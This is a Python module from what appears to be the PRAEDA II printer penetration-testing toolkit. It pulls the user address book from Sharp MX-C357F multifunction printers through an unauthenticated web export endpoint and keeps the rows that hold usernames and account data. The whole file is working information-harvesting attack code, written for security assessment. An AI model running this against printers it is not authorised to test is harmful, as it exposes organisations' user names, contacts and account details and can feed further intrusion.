# Retrieve the user address book on Sharps
######################################################
#                 PRAEDA II Module #MP0009           #
#                  Copyright (C) 2024                #
#              Deral 'percent_x' Heiland             #
#######################################################
# This module will work on the following Sharps models#
#      MX-C357F                                       #
#######################################################


#     ****THIS MODULE NEEDS FURTHER TESTING****

import requests
import csv
from io import StringIO

def MP0009(TARGET, PORTS, web, OUTPUT, LOGFILE, data1):
    # Set global variables
    count = 1

    # Open output file for logging
    try:
        with open(f'{OUTPUT}/{LOGFILE}.log', 'a') as logFile:
            # URL for the initial request.
            url = f"http{web}://{TARGET}:{PORTS}/webglue/contacts/export"
            print(f"Attempting to retrieve address book from Sharp MFP {TARGET}")

            # Make the HTTP(s) request
            response = requests.get(url, verify=False)

            # Check if the request was successful
            if response.status_code == 200:
                # Convert response text to a CSV reader object
                csv_data = csv.reader(StringIO(response.text))
                headers = next(csv_data, None)  # Get the header

                # Prepare to write filtered data to a new CSV file
                output_file_path = f"{OUTPUT}/{TARGET}_{PORTS}_AddressBook.csv"
                with open(output_file_path, 'w', newline='') as csvfile:
                    writer = csv.writer(csvfile)
                    writer.writerow(headers)

                    # Initialize a flag to check for account-related data
                    account_data_present = False

                    for row in csv_data:
                        if row[1] or row[2] or row[3]:  # Check 'membership', 'username', 'account_type'
                            writer.writerow(row)
                            account_data_present = True

                    if account_data_present:
                        print(f"\033[91mSUCCESS\033[0m: Sharps Address book CSV file saved as {TARGET}_{PORTS}_AddressBook.csv\n")
                        logFile.write(f"\033[91mSUCCESS\033[0m:4:Sharps Address book:{TARGET}:{PORTS}:{data1}:::{TARGET}_{PORTS}_AddressBook.csv::\n")
                    else:
                        print(f"FAILED: No account data found in the address book.")
                        logFile.write(f"FAILED:4:Sharps Address book file recovery failed:{TARGET}:{PORTS}:{data1}:::::\n")
            else:
                print(f"FAILED: to fetch data. Status code: {response.status_code}")
                logFile.write(f"FAILED: to fetch data. Status code: {response.status_code}\n")
    except Exception as e:
        print(f"Failed to open output file {OUTPUT}\nError: {str(e)}")
        with open(f'{OUTPUT}/{LOGFILE}.log', 'a') as logFile:
            logFile.write(f"Failed to open output file {OUTPUT}\nError: {str(e)}\n")

